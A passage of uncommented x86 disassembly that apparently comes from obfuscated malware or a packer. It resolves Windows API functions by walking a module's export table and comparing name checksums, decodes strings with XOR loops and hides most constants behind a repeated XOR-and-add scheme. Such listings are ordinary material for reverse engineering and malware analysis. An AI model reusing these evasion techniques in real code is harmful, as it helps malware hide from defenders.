  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
